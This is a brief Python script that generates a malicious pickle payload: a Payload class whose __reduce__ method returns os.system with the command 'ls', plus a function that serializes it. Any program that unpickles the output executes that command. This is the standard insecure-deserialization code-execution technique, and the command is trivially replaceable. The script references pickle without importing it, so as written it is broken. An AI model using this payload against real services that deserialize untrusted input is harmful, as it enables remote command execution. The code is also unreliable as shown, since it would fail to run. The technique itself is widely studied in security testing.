import os


class Payload(object):
    def __reduce__(self):
        return os.system, ('ls',)


def makePickleData(payload: Payload):
    """
    Get serialized data from the payload object and serialize it before returning it
    """
    serialized_data = pickle.dumps(payload, protocol=pickle.HIGHEST_PROTOCOL)
    return serialized_data